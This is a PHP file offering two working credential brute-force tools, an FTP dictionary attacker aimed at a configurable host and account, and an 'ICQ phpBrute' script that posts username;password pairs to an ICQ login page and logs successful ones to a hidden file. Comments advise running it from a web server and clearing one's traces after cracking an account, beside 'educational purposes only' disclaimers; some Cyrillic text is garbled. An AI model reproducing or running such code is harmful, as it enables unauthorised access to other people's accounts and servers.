<?
/*
* This PHP script version TRITON v.AlekhinYURI_19
* this script is Represents damage to your computer 
* if you do serious changes , with this piece of code.
* Intended for educational purposes only!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
*
* This bad script probes an FTP dictionary attack
*
* @URL        : http://www.firstsoft.hut1.ru/triton/
* @DESCTIPTION: TRITON v.AlekhinYURI_19
* This PHP script tries a password 
* from the password file each time intil it finds it.
* Execute it from a webpage on your server, not from
* the command line(!). And remember to clear your
* traces if you succeed in cracking the password
* of the FTP account you desire. And once again,
* I am not responsible for any of your actions
* with this code.
*/
?>
<?
$data = date("Y-m-d-h--i-s");
?>
<html>
<HEAD>
<META HTTP-EQUIV="Refresh" CONTENT="0;url=index.php?<?print "$data";?>">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1251">
<TITLE>TRITON</TITLE>
<base href="http://firstsoft.hut1.ru/">
</head>
</html>
<table>
<?
print "This PHP script version TRITON v.AlekhinYURI_19";?><br>
<?
print "������ ��� TRITON v.AlekhinYURI_19";?><br>
<?
print "dat";?><br>
<?
exit();
?>
<tr>
</table>
<?php
error_reporting(E_PARSE); //we want any exception except from WARNING MESSAGES
set_time_limit(0); // set the time limit for the script to +oo

$passwordfile = "passwd.dic";   //this is the path to the passwordfile
$targethost = "ftp.xxxxxx.xxxx"; //change this to the host you want to attack
$usrname = "xxxxxxxxxxxxx"; // change this to the username
                                              // of the FTP account you want
                                              // to attack
$interval = 1; // this is the break the script each time it tries a password
               // do not set this to zero

//change the second arguments you desire
$crh = "Sorry, the host you specified cannot be retrieved!";
$cc = "<font color=\"red\">Sorry, I cannot connect to $targethost with <b>$username</b> and password: $trypassword</font><br>";


/* DO NOT CHANGE ANYTHING BELOW THIS LINE UNLESS YOU REALLY KNOW WHAT YOU ARE DOING */

if(!file_exists($passwordfile)) {
	die("Sorry, the passwordfile <b>$passwordfile</b> cannot be retrieved");
} else {
	// open connection funtion
        function openconnection($targethost,$username,$trypassword) {
			print "<hr>Trying password <b>$trypassword</b> for <b>".$username."</b> to $targethost<hr><br>";
			$ftp_conn = @ftp_connect($targethost) or print $crh;
			if($ftp_conn) {
				$trylogin = @ftp_login($ftp_conn,$username,$trypassword);
					if(!$trylogin) {
						print $cc;
					} else {
						print "<b><font color=\"red\">The password is: $trypassword</font></b><br>";
						@ftp_quit($ftp_conn);
						break;
					}
			}
		}
        //end of function

        // try to open the password file
	$fp = @fopen($passwordfile,"r");
	if(!$fp) {
		die("The password file cannot open");
	} else {
		print "<b>The passwordfile is forked!</b>";
		//get the passwords
		while($trypassword = @fgets($fp,1024)) {
			openconnection($targethost,$usrname,$trypassword);
			sleep($interval);
		}
	}
	//...and close the password file or die of errors
	@fclose($fp) or die("\n<br>\nCannot close the password file!\n");
	echo "<b>The password file has closed";
 
}

//The given script has been altered under the educational purposes, for check of reliability of server FTP
?>
<?
//2 part
exit();
?>
<?
/*
* This PHP script version TRITON v.AlekhinYURI_19
* this script is Represents damage to your computer 
* if you do serious changes , with this piece of code.
* Intended for educational purposes only!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
*/

///��� ����, ���� ������ ���������� �������
set_time_limit(0);

///����� ��� ������ �� ���������
Error_Reporting(E_ALL & ~E_NOTICE);

///���������, ������� �� ������
$config=array();
$config['good']='./.htgood.txt';   ///���������� ������� ������ ����(���������� ��������� .ht, ����� ���� ������ ����� �� ��� ���������) 
$config['pass']='./pass.txt';      ///���� �������
$config['separator']=';';          /// ����������� ���;pass
$config['host']='www.icq.com';     /// HTTP ������ �������
$config['port']=80;                /// HTTP ����
$config['statfile']='./stat.html'; ///��������� ����

///���� ������ �������, �� ������ ��������� ������
if(file_exists($config['statfile'])) 
 {
 include($config['statfile']);
 echo '
 </body>
 </html>';
 exit();
 } 
 
///���� ������������ ���������
$request  = "POST /karma/login.php HTTP/1.1\r\n";
$request .= "Host: ".$config['host']." \r\n";
$request .= "User-Agent: Opera 7.50";
$request .= "rulez\r\n";
$request .= "Keep-Alive: 300\r\n";
$request .= "Connection: keep-alive\r\n";
$request .= "Referer: http://yandex.ru/ \r\n";

///������ � ������� ����
$goodcount=0;
$badcount=0;

///�������� ����� � ��������
$pass=file($config['pass']);

///��������������� ����
for($i=0;$i<count($pass);$i++)
 {
   list($s,$s1)=explode($config['separator'],$pass[$i]);
   
   ///������ ��� �������� � �������
   $posts = array ( 'dest' => '/whitepages/user_details.php',
                 'desc' => '', 
                 'service' => '20',
                 'css'=> 'whitepages',
                 'uin_email'=> $s,
                 'password' => trim($s1)
                  );
   $postValues="";
   $s='';
   
   ///�����������
   foreach( $posts AS $name => $value )
   {
      $postValues .= urlencode($name) . "=" . urlencode($value) . '&';  
   }
   
   ///������� post ������
   $lenght = strlen($postValues);
   $request2 = $request."Content-Type: application/x-www-form-urlencoded\r\n";
   $request2 .= "Content-Length: $lenght\r\n";
   $request2 .= "\r\n";
   $request2 .= $postValues;
   
   ///��������� �����
$fp = fsockopen($config['host'],$config['port'], $errno, $errstr, 30);
if (!$fp) 
{
   ///�� ������ ������
   echo "$errstr ($errno)<br />\n";
} 
else 
{
   ///���������� ������ �� whitepages
   fwrite($fp, $request2);
   while (!feof($fp)) 
   {
       $s.=fgets($fp, 128);
   }
   
}
   ///��������� �����
   fclose($fp);
   
   ///���� ����� ������������, �� whitepages �������� ����, ������� �� � �����. ��� �������� �� �� ���������
if(strpos($s,'Set-Cookie')==true)
  {
   $good=fopen($config['good'],'a');
   fwrite($good,$pass[$i]);
   fclose($good);
   $goodcount++;
  }
  else $badcount++; 
  
 if($i%10==0) 
   { 
    $count=count($pass)-$i; 
    
    ///���������� ����������
    $s=<<<HTML
--------------------------<br>
<b>Artix ICQ phpBrute</b> <br>
--------------------------<br>
�������: $goodcount<br>
������:  $badcount<br>
��������: $count<br>
---<br>
HTML;

    $stat=fopen($config['statfile'],'w+');
    fwrite($stat,$s);
    fclose($stat);   
 }
} 

$s=<<<HTML
--------------------------<br>
<b>Artix ICQ phpBrute</b> <br>
--------------------------<br>
������ ���������. <br>
�������: $goodcount<br>
������:  $badcount<br>
��� �����������, ������� ���� �� �����������<br>
---<br>
HTML;

///������ ��������� ���������� � ����
$stat=fopen($config['statfile'],'w+');
fwrite($stat,$s);
fclose($stat); 

///���� ��������
?>
��������� ����� ����������� �� ���� ����, ��� "�������� ������������ ������� �� TRITON(v.AlekhinYURI_19).Brute.a"
��� ������� � ���, ��� � ������ ���� ���� "����������� �����������"
��� ������� � ����� �������������� ������������ ������������� ����� ����� �� ����� ��������.
������ ������ ������ � ��������������� �����.
� �� ���� �� ����� ��������������� �� ���� �������� � �������� ������� ��� ����...
������ ������ ���������� ����� ����� ���������� � ���������...
�������, ��� ���� ��������� ��������� ���� ���� �����, ������ ���� ��� �������
--------------------------------------------------------
The antivirus will react to this file, as " is potentially dangerous ON TRITON (v. AlekhinYURI_19) .Brute.a " It is connected is made by that I have sent this file " kaspersky lab " It with the purpose of prevention of illegal use of this file on ����� servers. The given script is created in the educational purposes. I do not bear what responsibility for your actions and actions of a script or other... The Given script uses parts of another's development in particular... 
Remember, that if the antivirus has designated this file differently, the file means was changed 